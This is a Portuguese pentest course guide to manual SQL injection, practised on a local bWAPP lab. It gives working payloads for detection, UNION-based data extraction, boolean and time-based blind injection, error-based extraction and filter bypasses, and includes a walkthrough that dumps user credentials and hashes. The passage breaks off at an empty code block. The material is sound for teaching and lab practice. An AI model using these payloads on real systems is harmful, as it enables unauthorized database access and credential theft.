# Guia Prático de SQL Injection Manual
### Material de apoio — Pentest em Aplicações Web

> Este material foi pensado para alunos que vão fazer a prova prática sem usar ferramentas automatizadas (SQLMap, etc.). O objetivo é dominar a **metodologia de investigação manual**: cada payload é um experimento que confirma ou refuta uma hipótese sobre como a query está montada no servidor.

---

## Sumário

1. [Mentalidade e metodologia](#1-mentalidade-e-metodologia)
2. [Setup do ambiente de prática](#2-setup-do-ambiente-de-prática)
3. [Fase 1 — Detectando a vulnerabilidade](#3-fase-1--detectando-a-vulnerabilidade)
4. [Fase 2 — Mapeando o contexto da injeção](#4-fase-2--mapeando-o-contexto-da-injeção)
5. [Fase 3 — UNION-based passo a passo](#5-fase-3--union-based-passo-a-passo)
6. [Fase 4 — Enumerando o banco](#6-fase-4--enumerando-o-banco)
7. [Fase 5 — Quando UNION não funciona (Blind)](#7-fase-5--quando-union-não-funciona-blind)
8. [Fase 6 — Error-based](#8-fase-6--error-based)
9. [Fase 7 — Bypasses básicos](#9-fase-7--bypasses-básicos)
10. [Checklist de validação por fase](#10-checklist-de-validação-por-fase)
11. [Cheatsheet final](#11-cheatsheet-final)
12. [Aplicando no bWAPP — laboratório passo a passo](#12-aplicando-no-bwapp--laboratório-passo-a-passo)

---

## 1. Mentalidade e metodologia

### Por que aprender manual?

Quem só sabe rodar SQLMap não sabe SQL injection — sabe rodar SQLMap. Quando a ferramenta falha (e ela falha: WAF, lógica esquisita, contexto raro), só quem entende o que está acontecendo na query consegue avançar. Além disso, provas práticas e CTFs costumam proibir automação.

### O método científico aplicado ao pentest

Toda exploração manual segue o mesmo loop:

1. **Hipótese** — "acho que esse parâmetro está concatenado numa cláusula `WHERE`, dentro de aspas simples"
2. **Experimento** — envia um payload mínimo que testa só essa hipótese
3. **Observação** — o que mudou na resposta? (status, tamanho, conteúdo)
4. **Conclusão** — confirma, refuta ou refina a hipótese
5. **Próximo experimento** — mais específico, baseado no que aprendeu

> ⚠️ **Regra de ouro:** um payload de cada vez, mudando uma coisa por vez. Se mudar duas coisas e algo der certo, você não sabe qual delas funcionou.

### Os três sinais que você sempre observa

Toda análise de resposta HTTP olha pra três coisas:

| Sinal | O que indica |
|-------|--------------|
| **Status HTTP** | 200 vs 500 vs redirect — mudou de comportamento? |
| **Tamanho do body** | Resposta cresceu/encolheu? Indica linhas a mais/a menos |
| **Conteúdo** | Mensagem de erro, presença/ausência de dados, texto específico |

Se você não consegue diferenciar dois payloads pelo menos por um desses, está cego.

---

## 2. Setup do ambiente de prática

### Ferramentas mínimas

- **bWAPP** rodando local a partir deste próprio repositório (imagem customizada `bwapp-php7`, definida no `Dockerfile` + `docker-compose.yml`)
- **Burp Suite Community** — use o Repeater obsessivamente
- **Bloco de notas** — pra registrar payloads que funcionaram (você vai esquecer)

### Subindo o ambiente

A partir da raiz deste repositório:

```bash
docker compose up -d --build
```

> Se o `docker compose` (v2) não estiver disponível, use `docker-compose up -d` ou suba pelo Docker Desktop.

Isso sobe dois containers:

- **web** — imagem customizada `bwapp-php7:20240402` (PHP 7.4 + Apache + bWAPP), exposta em `http://localhost:80`
- **db** — `mariadb:10.6`, exposta em `localhost:3306` (root sem senha)

Na primeira execução, inicialize o banco do bWAPP:

1. Acesse **http://localhost/install.php**
2. Clique no link `here` que aparece para criar a base
3. Faça login em **http://localhost/login.php** com `bee` / `bug`

A funcionalidade alvo deste guia (`search.php`) fica em **http://localhost/sqli_1.php** depois do login — escolha o nível de segurança `low` no menu superior pra começar.

### Workflow recomendado

1. Navegue até a funcionalidade alvo no browser, com o Burp interceptando
2. Capture a requisição
3. Mande pro **Repeater** (Ctrl+R)
4. Faça TODOS os testes ali, comparando respostas lado a lado

Por que não testar no browser? Porque você precisa repetir exatamente a mesma requisição mudando só o parâmetro alvo. No browser tem cookie mudando, JS executando, cache atrapalhando. No Repeater você tem controle total.

### Alvo de exemplo deste guia

Vamos usar o `search.php` do bWAPP — uma busca de filmes que monta uma query do tipo:

```sql
SELECT * FROM movies WHERE title LIKE '%<INPUT>%'
```

Esse alvo é didático porque combina três dificuldades reais: contexto de string, dentro de `LIKE` com wildcards, e múltiplas colunas retornadas. Se você domina ele, domina a maioria dos casos.

---

## 3. Fase 1 — Detectando a vulnerabilidade

**Objetivo:** confirmar que o parâmetro é injetável.
**Hipótese inicial:** "este input está sendo concatenado numa query SQL sem sanitização."

### 3.1 O teste da aspa simples

O payload mais clássico e mais útil:

```
'
```

Mande uma aspa simples sozinha e observe.

| Resposta | Interpretação |
|----------|---------------|
| Erro SQL visível (`You have an error in your SQL syntax...`) | 🎯 SQLi quase certa, in-band, provavelmente error-based disponível |
| HTTP 500 ou página quebrada sem mensagem | 🎯 SQLi provável, erro suprimido |
| Página normal, mesmos resultados | ⚠️ Talvez não seja vulnerável, ou input está sendo escapado |
| Página normal, zero resultados | ⚠️ Pode ser SQLi com erro silencioso — investigar mais |
| `403 Forbidden` ou bloqueio | 🛡️ Tem WAF, vai precisar de bypass |

**Validação:** se viu mensagem de erro ou 500, marque essa URL como "confirmadamente injetável" e siga. Se viu página normal, ainda não desista — vá para o próximo teste.

### 3.2 Teste de lógica booleana

Aqui você confirma que consegue **manipular a lógica** da query, não só quebrá-la. Use duas requisições gêmeas:

**Payload A** (deve ser sempre verdadeiro):
```
a' OR '1'='1
```

**Payload B** (deve ser sempre falso):
```
a' AND '1'='2
```

Compare o tamanho e o conteúdo das respostas:

| Comparação A vs B | Conclusão |
|-------------------|-----------|
| A retorna mais dados (ou tudo) que B | ✅ SQLi confirmada — manipulação lógica funciona |
| A e B retornam igual | ❌ Não é SQLi, ou input está parametrizado |
| A retorna erro, B retorna normal (ou vice-versa) | ⚠️ Contexto diferente do esperado — reavalie a hipótese |

> 💡 **Por que `a'` e não só `'`?** Porque o `LIKE '%a%'` quase sempre retorna algo, então você tem uma baseline visível pra comparar. Com aspa solta, A e B podem retornar zero linhas e você não diferencia nada.

### 3.3 Teste com payload numérico (caso o parâmetro pareça ser número)

Se o input parece ser um ID numérico (`?id=5`), os testes mudam:

```
5 AND 1=1     ← deve retornar normal
5 AND 1=2     ← deve retornar vazio/diferente
5'            ← deve quebrar (se for numérico mesmo, talvez nem precise da aspa)
```

A diferença entre numérico e string vai definir todos os próximos payloads, então isso importa.

---

## 4. Fase 2 — Mapeando o contexto da injeção

**Objetivo:** descobrir exatamente o que vem antes e depois do seu input na query original. Sem isso, qualquer payload mais complexo vai dar erro de sintaxe.

### 4.1 String ou numérico?

Já cobrimos acima. Se aspa quebra e tirar a aspa não quebra → contexto de string. Se aspa nem é necessária e operadores numéricos funcionam → numérico.

### 4.2 Que tipo de aspa?

Quase sempre aspa simples (`'`), mas pode ser:
- Aspa dupla (`"`) — raro, mais comum em alguns frameworks
- Sem aspa, dentro de parênteses — `WHERE id=(5)` por exemplo
- Backtick (`` ` ``) — praticamente nunca em valor, só em identificador

Teste cada um isoladamente:

```
'      → quebrou? string com aspa simples
"      → quebrou? string com aspa dupla
\      → quebrou? talvez escape mal feito
```

### 4.3 Tem parênteses sobrando?

Algumas queries são tipo `WHERE (id=5) AND active=1`. Pra fechar isso direito, seu payload precisa fechar parêntese também:

```
1) OR (1=1
```

Se aspa sozinha quebra mas `' OR '1'='1` continua quebrando, suspeite de parênteses. Vá adicionando `)` até parar de dar erro.

### 4.4 O que vem depois?

A parte mais negligenciada. Se a query original é:

```sql
WHERE title LIKE '%<INPUT>%' ORDER BY id
```

E você injeta `' UNION SELECT ...`, vai sobrar `%' ORDER BY id` no final, que provavelmente vai dar erro.

**A solução universal:** comentar o resto da query. No MySQL:

```
-- -        ← traço-traço-espaço-traço (o `-` final é pra garantir)
#           ← funciona no MySQL mas não em URL sem encode (%23)
/*          ← funciona, mas pode precisar fechar com */ se for filtrado
```

Então um payload "completo" sempre termina assim:

```
a' UNION SELECT ... -- -
```

> ⚠️ **Pegadinha clássica:** `--` sozinho NÃO é comentário em MySQL. Precisa ser `-- ` (com espaço) ou `--<qualquer_coisa>`. Por isso a convenção `-- -`.

### 4.5 Validação do contexto

Antes de seguir, você deve conseguir mandar um payload "neutro" que retorna a página **exatamente igual** ao input original. Se input original é `iron`, o payload validador é:

```
iron' AND '1'='1
```

Resultado esperado: idêntico a só `iron`. Se for, você dominou o contexto. Se não for, ainda tem algo errado.

---

## 5. Fase 3 — UNION-based passo a passo

**Objetivo:** usar `UNION SELECT` pra fazer a query retornar dados que VOCÊ escolheu, não os filmes.

### 5.1 Por que UNION é o sonho?

Porque traz dados diretamente na página. Blind é lento e chato; UNION você vê o resultado na hora. Se der pra usar UNION, use.

### 5.2 Pré-requisitos do UNION

Pra `UNION` funcionar, a segunda query precisa ter:

1. **O mesmo número de colunas** que a primeira
2. **Tipos de dados compatíveis** em cada coluna (mais relaxado do que parece — string e número geralmente convivem)

Então o passo 1 é descobrir quantas colunas a query original retorna.

### 5.3 Descobrindo o número de colunas: ORDER BY

Vá incrementando o número até dar erro:

```
a' ORDER BY 1 -- -
a' ORDER BY 2 -- -
a' ORDER BY 3 -- -
...
a' ORDER BY 8 -- -
```

| O que observar | Conclusão |
|----------------|-----------|
| `ORDER BY 7` funciona, `ORDER BY 8` dá erro | A query tem **7 colunas** |
| Todos retornam normal até número absurdo | Talvez o erro esteja suprimido — use UNION direto (próximo passo) |

> 💡 **Por que ORDER BY funciona?** Porque ele aceita posições numéricas (`ORDER BY 3` = ordene pela 3ª coluna). Se a coluna não existe, dá erro. É o jeito mais econômico de contar colunas — uma requisição por número.

> 💡 **Otimização:** se suspeitar que são muitas colunas, faça busca binária. Tente `ORDER BY 10`. Se funciona, tente 20. Se quebra, tente 15. Etc.

### 5.4 Confirmando com UNION SELECT NULL

Encontrou 7 colunas? Confirme com:

```
a' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL -- -
```

Resultado esperado: a página carrega normalmente (talvez com uma linha vazia/em branco a mais, talvez não visível). Se der erro de "different number of columns", você contou errado — refaça.

**Por que NULL?** Porque NULL é o tipo mais flexível do SQL: aceita ser cast pra qualquer coisa. Se você botar `1,2,3,4,5,6,7` pode dar erro de tipo em alguma coluna específica. NULL nunca dá.

### 5.5 Descobrindo quais colunas refletem na página

Crucial. A query retorna 7 colunas, mas o PHP provavelmente só imprime algumas delas no HTML. Você precisa saber **quais aparecem na tela** — só essas servem como "tela" pra você ler dados.

Substitua os NULLs por números identificáveis, um por vez ou todos:

```
a' UNION SELECT 1,2,3,4,5,6,7 -- -
```

Agora vá no HTML da resposta e procure por `1`, `2`, `3`... onde apareceriam títulos/diretores/gêneros de filme.

Resultados típicos no bWAPP search.php:
- `2`, `3`, `4`, `5` aparecem no HTML (correspondem a title, release, character, genre)
- `1` (id), `6`, `7` ficam ocultos

> 💡 **Cuidado com tipos:** se ao trocar NULL por número alguma coluna der erro, é porque ela espera string. Aí faça `'1','2','3',...` ou `NULL,2,NULL,4,...` mantendo NULL nas que dão problema. Mas isso é raro — quase sempre número direto funciona.

### 5.6 Teste de fumaça: imprima algo que você reconheça

Antes de tentar extrair dados reais, faça um teste sanity:

```
a' UNION SELECT 1,'PWNED','aqui','meu','teste',6,7 -- -
```

Se você ver "PWNED" e "aqui" aparecendo onde deveria estar título e ano de filme, **você confirmou que tem controle total**. A partir daqui é só substituir essas strings por funções e subqueries.

---

## 6. Fase 4 — Enumerando o banco

**Objetivo:** descobrir bancos, tabelas, colunas e finalmente extrair dados.

Você sabe que tem 7 colunas e que as colunas **2, 3, 4 e 5** aparecem na tela. Vamos usar isso.

### 6.1 Reconhecimento básico

Pegue informações rápidas pra entender o terreno:

```
a' UNION SELECT 1,version(),database(),user(),@@hostname,6,7 -- -
```

Você vai ver na página:
- **Coluna 2** (`version()`): versão do MySQL (ex: `5.7.31`)
- **Coluna 3** (`database()`): banco atual (ex: `bWAPP`)
- **Coluna 4** (`user()`): usuário conectado (ex: `root@localhost`)
- **Coluna 5** (`@@hostname`): nome da máquina

**Validação:** se viu essas informações, você está pronto pra enumeração séria.

### 6.2 Listando bancos disponíveis

O MySQL guarda metadados sobre tudo no banco `information_schema`. Pra listar todos os bancos:

```
a' UNION SELECT 1,schema_name,3,4,5,6,7 FROM information_schema.schemata -- -
```

Vai aparecer uma linha por banco. No bWAPP você verá algo como:
- `information_schema`
- `bWAPP`
- `mysql`
- `performance_schema`
- `sys`

> 💡 **E se só uma linha aparecer?** Algumas aplicações só imprimem o primeiro resultado. Aí use `GROUP_CONCAT` pra juntar tudo numa string só:
>
> ```
> a' UNION SELECT 1,GROUP_CONCAT(schema_name SEPARATOR ','),3,4,5,6,7 FROM information_schema.schemata -- -
> ```

### 6.3 Listando tabelas de um banco

```
a' UNION SELECT 1,GROUP_CONCAT(table_name SEPARATOR ','),3,4,5,6,7 FROM information_schema.tables WHERE table_schema='bWAPP' -- -
```

No bWAPP você vai ver tabelas como `movies`, `users`, `heroes`, `blog`, `visitors`.

> 💡 **Se aspa simples for filtrada,** use hex. `bWAPP` em hex é `0x6257415050`:
>
> ```
> ... WHERE table_schema=0x6257415050 -- -
> ```
>
> Pra converter qualquer string em hex no terminal: `echo -n 'bWAPP' | xxd -p`

### 6.4 Listando colunas de uma tabela

A tabela `users` chamou sua atenção. Liste as colunas:

```
a' UNION SELECT 1,GROUP_CONCAT(column_name SEPARATOR ','),3,4,5,6,7 FROM information_schema.columns WHERE table_schema='bWAPP' AND table_name='users' -- -
```

Você vai ver algo como: `id,login,password,email,secret,activation_code,activated,reset_code,admin`.

**Validação:** se você consegue ler estrutura, o próximo passo é trivial.

### 6.5 Extraindo dados de verdade

Hora do prêmio:

```
a' UNION SELECT 1,login,password,email,secret,6,7 FROM bWAPP.users -- -
```

Você vai ver hashes, emails e secrets aparecendo onde deveriam estar os filmes. Quando tem múltiplos usuários:

```
a' UNION SELECT 1,GROUP_CONCAT(login,0x3a,password SEPARATOR 0x0a),3,4,5,6,7 FROM bWAPP.users -- -
```

`0x3a` é `:` e `0x0a` é quebra de linha. Resultado fica `usuario1:hash1\nusuario2:hash2\n...`.

### 6.6 Validação final

Você sabe que terminou a fase de enumeração quando:
- ✅ Lista de bancos extraída
- ✅ Tabelas de pelo menos um banco enumeradas
- ✅ Colunas de pelo menos uma tabela sensível enumeradas
- ✅ Dados sensíveis (credenciais, etc.) extraídos

Hora de quebrar os hashes em outra ferramenta (hashcat/john) e seguir pro pós-exploração — mas isso é outro material.

---

## 7. Fase 5 — Quando UNION não funciona (Blind)

Cenários em que UNION não serve:
- A página não imprime dados da query (só "encontrou" / "não encontrou")
- O resultado não reflete em lugar visível
- Erros são totalmente suprimidos

Aí você usa **Blind SQLi**: faz a query responder em SIM/NÃO ou em DEMOROU/NÃO DEMOROU, extraindo um caractere por vez.

### 7.1 Boolean-based blind

A página tem dois estados: "achou" e "não achou". Você forja perguntas cuja resposta enviesa esse estado.

**Pergunta-base:** "A primeira letra do banco atual é 'b'?"

```
a' AND SUBSTRING(database(),1,1)='b' -- -
```

- Página normal → SIM, é 'b'
- Página vazia → NÃO, não é 'b'

Pra extrair caractere por caractere, você varia a posição e a letra:

```
a' AND SUBSTRING(database(),1,1)='a' -- -    ← não
a' AND SUBSTRING(database(),1,1)='b' -- -    ← SIM
a' AND SUBSTRING(database(),2,1)='a' -- -    ← não
a' AND SUBSTRING(database(),2,1)='W' -- -    ← SIM
...
```

Vai construindo `b`, `bW`, `bWA`, `bWAP`, `bWAPP`.

**Otimização: busca binária com ASCII**

Em vez de testar 26 letras, teste o valor ASCII com `<` e `>`:

```
a' AND ASCII(SUBSTRING(database(),1,1)) > 100 -- -    ← SIM (é > 100)
a' AND ASCII(SUBSTRING(database(),1,1)) > 110 -- -    ← não
a' AND ASCII(SUBSTRING(database(),1,1)) > 105 -- -    ← não
a' AND ASCII(SUBSTRING(database(),1,1)) > 102 -- -    ← SIM
a' AND ASCII(SUBSTRING(database(),1,1)) = 98 -- -     ← SIM → 'b'
```

7 requisições em vez de 26. Para senhas grandes isso vira a diferença entre 30 minutos e 6 horas.

**Validação de boolean blind:**
- Você consegue diferenciar SIM de NÃO sem dúvida na resposta? Tamanho, conteúdo, qualquer coisa?
- Sua "pergunta-âncora" `1=1` retorna SIM e `1=2` retorna NÃO claramente?

Se sim, está pronto. Se não, blind boolean não é viável aqui — vá pra time-based.

### 7.2 Time-based blind

Quando a página é IDÊNTICA pra SIM e NÃO (zero diferença visível). Aí você usa o tempo de resposta como canal.

**Payload-base:**

```
a' AND IF(SUBSTRING(database(),1,1)='b', SLEEP(3), 0) -- -
```

Tradução: "se a primeira letra do banco for 'b', durma 3 segundos; senão, faz nada".

- Resposta demorou ~3s → SIM, é 'b'
- Resposta voltou imediata → NÃO, não é 'b'

Mesma técnica de busca binária, só que medindo tempo. Lentíssimo, mas funciona quando nada mais funciona.

> ⚠️ **Cuidado com `LIKE '%a%'`:** se a query original faz `LIKE`, o `SLEEP` é avaliado por linha. Se a busca retorna 1000 filmes, são 1000 × 3s = troll. Use `LIMIT 1` na injection ou condicione com uma subquery única:
>
> ```
> a' AND IF((SELECT SUBSTRING(database(),1,1))='b', SLEEP(3), 0) -- -
> ```

**Calibragem:** rode `SLEEP(0)` e `SLEEP(5)` e meça os tempos. Se a rede já é lenta e variável, talvez precise usar `SLEEP(10)` pra ter sinal claro acima do ruído.

### 7.3 Automatizando blind manualmente

Mesmo "manual", ninguém vai mandar 200 requisições à mão. Use o **Intruder** do Burp:

1. Mande o payload base pro Intruder
2. Marque a posição da letra a testar (`SUBSTRING(database(),§1§,1)`) e do valor ASCII (`> §100§`)
3. Use Cluster Bomb pra cruzar posições × valores
4. Ordene resultados por tamanho ou tempo de resposta

Continua sendo "manual" no sentido de que VOCÊ montou o payload e interpreta os resultados. SQLMap proibido ≠ Burp Intruder proibido (em geral — confirme com o avaliador).

---

## 8. Fase 6 — Error-based

Quando a aplicação mostra erros SQL na tela, dá pra extrair dados pelo próprio erro. É mais rápido que blind e mais simples que UNION.

### 8.1 EXTRACTVALUE / UPDATEXML

São funções de XML do MySQL que dão erro quando recebem XPath inválido. O erro **inclui o valor que você forneceu**.

```
a' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()))) -- -
```

O `0x7e` é `~`. A função tenta interpretar `~bWAPP` como XPath, falha, e cospe na tela:

```
XPATH syntax error: '~bWAPP'
```

Pronto, extraiu `database()` em uma requisição só. Pra extrair uma tabela:

```
a' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))) -- -
```

> ⚠️ **Limitação:** EXTRACTVALUE corta em ~32 caracteres. Se a string for maior, use `SUBSTRING` pra pegar em pedaços:
>
> ```
> ... (SELECT SUBSTRING(GROUP_CONCAT(table_name),1,32) FROM ...)
> ... (SELECT SUBSTRING(GROUP_CONCAT(table_name),33,32) FROM ...)
> ```

### 8.2 Quando usar error-based

- Mensagem de erro aparece na tela e contém o conteúdo do erro (não só "erro genérico")
- Você quer velocidade sem o trabalho de configurar UNION
- O número de colunas é muito grande ou desconhecido

---

## 9. Fase 7 — Bypasses básicos

Quando há filtro/WAF, você precisa trapacear na sintaxe.

### 9.1 Filtros de espaço

Algumas apps bloqueiam ` ` (espaço). Substitua por:

| Substituto | Como aparece |
|------------|--------------|
| `/**/` | `UNION/**/SELECT` |
| `%09` (tab) | `UNION%09SELECT` |
| `%0a` (newline) | `UNION%0aSELECT` |
| `+` (em URL) | `UNION+SELECT` |
| `()` em alguns casos | `SELECT(database())` |

### 9.2 Filtros de palavras-chave

Bloqueou `UNION`? Tente:
- Variação de case: `UnIoN` — funciona se o filtro for case-sensitive
- Comentário no meio: `UN/**/ION` — funciona se o filtro não normalizar
- Encoding duplo: `%2555NION` decodifica pra `%55NION` → `UNION` (depende da app)

Bloqueou `OR`? Use `||`. Bloqueou `AND`? Use `&&`. Bloqueou aspa simples? Use hex em vez de strings.

### 9.3 Filtros de aspa

Aspas escapadas (`\'`) ou removidas? Use representações alternativas:

```
WHERE name = 'admin'              ← aspa
WHERE name = 0x61646d696e          ← hex (sempre funciona)
WHERE name = CHAR(97,100,109,105,110)   ← CHAR()
```

### 9.4 Princípio geral

Filtros baratos checam strings literais. Filtros caros parseiam SQL de verdade. A maioria é barato. Bypass = encontrar a forma equivalente que o filtro não previu.

---

## 10. Checklist de validação por fase

Use isso pra ter certeza de que dominou cada fase antes de seguir.

### Fase 1 — Detecção
- [ ] Consigo gerar erro ou diferença mensurável injetando `'`?
- [ ] Confirmei diferença entre `1=1` e `1=2`?
- [ ] Sei se o contexto é string ou numérico?

### Fase 2 — Contexto
- [ ] Sei qual aspa fecha a string original?
- [ ] Sei se há parênteses sobrando?
- [ ] Consigo mandar um payload que comenta o resto e retorna página intacta?

### Fase 3 — UNION
- [ ] Sei quantas colunas tem a query original?
- [ ] Sei quais dessas colunas aparecem no HTML?
- [ ] Consegui imprimir uma string arbitrária minha na tela?

### Fase 4 — Enumeração
- [ ] Listei `version()`, `database()`, `user()`?
- [ ] Listei tabelas do banco alvo?
- [ ] Extraí dados sensíveis (credenciais)?

### Fase 5 — Blind (se UNION falhou)
- [ ] Tenho diferença clara entre SIM e NÃO (boolean) ou DEMOROU e NÃO DEMOROU (time)?
- [ ] Extraí pelo menos `database()` por blind?

### Fase 6 — Error-based (se aplicável)
- [ ] A mensagem de erro reflete dados que injeto via `EXTRACTVALUE`?

### Fase 7 — Bypass (se necessário)
- [ ] Identifiquei o que está sendo filtrado?
- [ ] Encontrei equivalência funcional que passa pelo filtro?

---

## 11. Cheatsheet final

### Detecção
```
'
a' OR '1'='1
a' AND '1'='2
```

### Contagem de colunas
```
a' ORDER BY 1 -- -
a' UNION SELECT NULL,NULL,...,NULL -- -
```

### Reconhecimento
```
a' UNION SELECT 1,version(),database(),user(),@@hostname,6,7 -- -
```

### Enumeração
```
-- Bancos
a' UNION SELECT 1,GROUP_CONCAT(schema_name),3,4,5,6,7 FROM information_schema.schemata -- -

-- Tabelas
a' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database() -- -

-- Colunas
a' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7 FROM information_schema.columns WHERE table_schema=database() AND table_name='users' -- -

-- Dados
a' UNION SELECT 1,GROUP_CONCAT(login,0x3a,password SEPARATOR 0x0a),3,4,5,6,7 FROM users -- -
```

### Blind boolean
```
a' AND SUBSTRING(database(),1,1)='b' -- -
a' AND ASCII(SUBSTRING(database(),1,1)) > 100 -- -
```

### Blind time
```
a' AND IF(SUBSTRING(database(),1,1)='b', SLEEP(3), 0) -- -
a' AND IF((SELECT SUBSTRING(database(),1,1))='b', SLEEP(3), 0) -- -
```

### Error-based
```
a' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()))) -- -
a' AND UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())), 1) -- -
```

### Conversão hex (terminal)
```bash
echo -n 'bWAPP' | xxd -p
# 6257415050  → use como 0x6257415050
```

### Comentários
```
-- -      (traço-traço-espaço-traço, mais seguro)
#         (encode como %23 em URL)
/* */     (clássico, pode fechar pares)
```

---

## Apêndice: erros comuns dos alunos

1. **Esquecer o `-- ` no final** — query vira lixo, dá erro genérico, aluno fica perdido. Sempre comente o resto.
2. **Confundir `--` com `-- `** — no MySQL precisa do espaço. Use `-- -` por padrão.
3. **Mudar duas coisas no payload de uma vez** — quando funciona, não sabe o quê fez funcionar.
4. **Não diferenciar contexto string de numérico** — manda `' UNION ...` num parâmetro numérico e fica achando que SQLi não existe.
5. **Esquecer GROUP_CONCAT em apps que mostram só uma linha** — extrai um único valor e acha que acabou.
6. **Testar no browser em vez do Repeater** — caos de cookies, JS e cache. Sempre Repeater.
7. **Não validar o contexto antes de partir pra UNION** — monta payload complexo em cima de hipótese errada.
8. **Time-based dentro de `LIKE` sem `LIMIT`** — `SLEEP(3)` × 500 linhas = espera 25 minutos por uma requisição.

---

**Bons testes. E lembrem-se: SQLi manual é sobre paciência metódica, não sobre payload mágico.**

---

## 12. Aplicando no bWAPP — laboratório passo a passo

Esta seção amarra a teoria acima nos exercícios reais que existem no bWAPP deste repositório. Cada laboratório é um cenário diferente do mesmo problema — string vs. numérico, GET vs. POST, in-band vs. blind. A ideia é que você consiga reproduzir o **método das fases 1→6** em cada um, em vez de decorar payload.

### 12.0 Preparando o ambiente

1. Suba o ambiente como descrito na Seção 2 (`docker compose up -d --build`).
2. Acesse **http://localhost/install.php** uma vez e clique em `here` para criar o banco.
3. Faça login em **http://localhost/login.php** com `bee` / `bug`.
4. No menu superior, defina o **Security Level = low** e clique em `Set`.
   - `low` → `no_check()` — input cru, sem filtro. Comece sempre por aqui.
   - `medium` → `mysqli_real_escape_string()` — aspa é escapada. Útil pra praticar bypass por contexto numérico ou hex.
   - `high` → prepared statements / sanitização forte. Geralmente **não** é explorável; serve pra você ver como o fix se parece.
5. Use **Burp Suite** com interceptação ligada e o **Repeater** para todo teste de payload (Seção 2).

> 💡 As funções `sqli_check_1`/`sqli_check_2` aplicadas em `low`/`medium` ficam em `bWAPP/functions_external.php`. Vale dar uma olhada depois — entender o filtro é metade do bypass.

### 12.1 Mapa dos exercícios de SQLi no bWAPP

| URL | Cenário | Técnica principal | Por onde começar |
|-----|---------|-------------------|------------------|
| `/sqli_1.php` | GET / busca de filmes (`title` via LIKE) | UNION-based string | Fase 1 → 4 |
| `/sqli_2.php` | GET / select de filme por `movie` (ID numérico) | UNION-based numérico | Fase 2 (contexto numérico) |
| `/sqli_6.php` | POST / busca de filmes | Igual ao `sqli_1`, mas via POST | Burp Repeater |
| `/sqli_13.php` | POST / select numérico | Igual ao `sqli_2`, mas via POST | Burp Repeater |
| `/sqli_3.php` | Login form (heroes) | Auth bypass | Fase 1 (boolean) |
| `/sqli_16.php` | Login form (users) | Auth bypass | Igual ao `sqli_3` |
| `/sqli_4.php` | Blind boolean (movies, sem LIKE) | Boolean-based blind | Fase 5.1 |
| `/sqli_15.php` | Blind time-based (AJAX/login email) | Time-based blind | Fase 5.2 |
| `/sqli_5.php` | Blind via SOAP | Blind em web service | Avançado |
| `/sqli_7.php` | Stored — Blog | Persistente | Persistir e disparar |
| `/sqli_17.php` | Stored — User-Agent | Persistente em header | Header injection |
| `/sqli_10-1.php` | AJAX/JSON/jQuery | Mesmo motor SQL, resposta JSON | Inspecionar XHR no Burp |

Os exercícios `sqli_11`, `sqli_12`, `sqli_14` usam SQLite — a sintaxe muda (sem `information_schema`, usa `sqlite_master`). Boa prática depois que dominar MySQL.

### 12.2 Walkthrough — `sqli_1.php` (GET/Search) em `low`

Esse é o alvo "de referência" do guia. Vamos executar as fases inteiras nele para servir de gabarito.

**Query real no servidor** (`bWAPP/sqli_1.php:143`):

```php
$sql = "SELECT * FROM movies WHERE title LIKE '%" . sqli($title) . "%'";
```

Sete colunas no `SELECT *` da tabela `movies`. Quatro aparecem no HTML (title, release, character, genre).

#### Passo 1 — Capturar a requisição

1. Browser em `/sqli_1.php`, Burp interceptando.
2. Pesquise `iron` e clique em `Search`.
3. No Proxy → HTTP history, pegue a requisição `GET /sqli_1.php?title=iron&action=search` e mande pro Repeater (`Ctrl+R`).

A partir daqui, **só mexa no Repeater**.

#### Passo 2 — Detecção (Fase 1)

| Payload em `title=` | Resultado esperado |
|---------------------|--------------------|
| `iron'` | Mensagem `Error: You have an error in your SQL syntax...` → injetável e error-based viável |
| `iron' OR '1'='1` | Lista TODOS os filmes (porque `%' OR '1'='1%'` casa tudo) |
| `iron' AND '1'='2` | Zero filmes |

Se reproduziu, marque a fase como concluída.

#### Passo 3 — Contexto (Fase 2)

A query usa LIKE com `'`. Para neutralizar o `%'` que sobra depois do seu input, comente:

```
iron' -- -
```

Resposta: deve voltar com os mesmos filmes do `iron%` original mas sem o sufixo `%`. Confirma que `-- -` está funcionando.

#### Passo 4 — Contagem de colunas (Fase 3)

```
iron' ORDER BY 1 -- -
iron' ORDER BY 2 -- -
...
iron' ORDER BY 7 -- -    ← ainda ok
iron' ORDER BY 8 -- -    ← erro: "Unknown column '8' in 'order clause'"
```

Resultado: **7 colunas**.

#### Passo 5 — Reflexão (Fase 3 continuação)

```
a' UNION SELECT 1,2,3,4,5,6,7 -- -
```

No HTML você vai ver `2`, `3`, `4`, `5` no lugar de `Title`, `Release`, `Character`, `Genre`. As colunas **1, 6 e 7** ficam escondidas.

#### Passo 6 — Reconhecimento (Fase 4)

```
a' UNION SELECT 1,version(),database(),user(),@@hostname,6,7 -- -
```

Espere algo como:

- `database()` → `bWAPP`
- `user()` → `root@%` (já que o `docker-compose.yml` usa MariaDB com root sem senha)
- `version()` → `10.6.x-MariaDB`

> Como é MariaDB e não MySQL "puro", certas funções têm pequenas diferenças, mas tudo neste guia funciona.

#### Passo 7 — Enumeração (Fase 4)

```
-- Tabelas
a' UNION SELECT 1,GROUP_CONCAT(table_name SEPARATOR ','),3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database() -- -

-- Colunas de users
a' UNION SELECT 1,GROUP_CONCAT(column_name SEPARATOR ','),3,4,5,6,7 FROM information_schema.columns WHERE table_schema=database() AND table_name='users' -- -

-- Dados
a' UNION SELECT 1,GROUP_CONCAT(login,0x3a,password SEPARATOR 0x0a),3,4,5,6,7 FROM users -- -
```

A coluna `password` da tabela `users` no bWAPP guarda **SHA-1 sem salt**. Os hashes `6885858486f31043e5839c735d99457f045affd0` (= `bug`) e `0d107d09f5bbe40cade3de5c71e9e9b7` (esse é MD5, usado em outros lugares) são clássicos. Use `hashcat -m 100` (SHA-1) pra brincar de quebrar offline.

#### Passo 8 — Error-based (Fase 6, alternativa)

Sem precisar montar UNION:

```
